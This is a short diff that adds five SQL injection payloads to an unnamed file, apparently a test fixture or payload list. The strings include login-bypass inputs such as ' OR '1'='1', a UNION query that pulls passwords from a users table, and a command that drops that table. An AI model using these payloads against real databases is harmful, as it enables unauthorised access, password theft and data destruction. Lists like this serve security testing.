@@ -1,0 +1,5 @@
+' OR '1'='1'; --
+'; DROP TABLE users; --
+" UNION SELECT password FROM users --
+admin' --
+' OR 1=1 LIMIT 1; --
